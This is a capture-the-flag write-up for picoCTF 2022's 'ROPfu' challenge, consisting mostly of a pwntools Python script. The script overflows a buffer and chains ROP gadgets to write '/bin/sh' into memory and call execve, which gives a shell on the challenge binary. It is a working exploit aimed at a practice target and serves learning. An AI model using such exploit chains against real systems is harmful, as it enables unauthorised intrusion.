---
name: ROPfu (2022)
event: Pico CTF 2022
category: Pwn
description: Writeup for ROPfu (Pwn) - Pico CTF (2022) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# ROPfu

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/dAsujQ_OPEk/0.jpg)](https://youtu.be/dAsujQ_OPEk?t=3002 "Pico CTF 2022: ROPfu")

## Description

> What's ROP?

## Solution

{% code overflow="wrap" %}
```py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
break *0x8049dd0
continue
'''.format(**locals())

# Binary filename
exe = './vuln'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# How many bytes to EIP?
offset = 28

io = start()

# ROP
rop = ROP(elf)  # Load rop so we can access gadgets

# Address of .data section
data_section_address = elf.symbols.data_start

# We will pop address of .data section into eax
# Later, we'll pop 0xb to eax for syscall
pop_eax = 0x80b074a  # pop eax; ret;

# Then pop the string "/bin" into edx (junk for ebx)
pop_edx_ebx = 0x80583c9  # pop edx; pop ebx; ret

# We'll mov the string in edx to the address pointed to by eax (.data)
# Then, we need to repeat again for "/sh\x00"
mov_eax_edx = 0x809e5d8  # mov dword ptr [eax], edx; ret;

# Pop .data section address ("/bin/sh") to ebx, make ecx zero, then execve
pop_ebx = 0x8049022  # pop ebx; ret;
pop_ecx = 0x8049e39  # pop ecx; ret;
execve_syscall = 0x8071650  # int 0x80; ret;

# Write first 4 bytes ("/bin") to data section
rop.raw([pop_eax, data_section_address, pop_edx_ebx, b'/bin', b'junk', mov_eax_edx])

# Write second 4 bytes ("/sh") to data (+ 4 bytes)
rop.raw([pop_eax, data_section_address + 0x4, pop_edx_ebx, b'/sh\x00', b'junk', mov_eax_edx])

# Syscall - execve (https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux#Via_interrupt)
rop.raw([pop_edx_ebx, 0x0, data_section_address, pop_ecx, 0x0, pop_eax, 0xb, execve_syscall])

# Build payload (inject rop_chain at offset)
payload = flat({
    offset: rop.chain()
})

# Save payload to file
write('payload', payload)

# PWN
io.sendlineafter(b'!', payload)
io.interactive()
```
{% endcode %}
